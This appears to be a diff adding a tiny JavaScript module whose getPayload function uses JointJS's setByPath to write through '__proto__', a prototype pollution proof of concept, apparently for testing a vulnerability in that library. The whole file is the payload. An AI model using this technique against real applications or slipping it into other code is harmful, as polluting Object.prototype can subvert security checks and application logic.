@@ -1,0 +1,7 @@
+function getPayload() {
+    const payload = {};
+    jointjs.util.setByPath(payload, "__proto__/polluted", "yes", "/");
+    return payload;
+}
+
+module.exports = { getPayload };
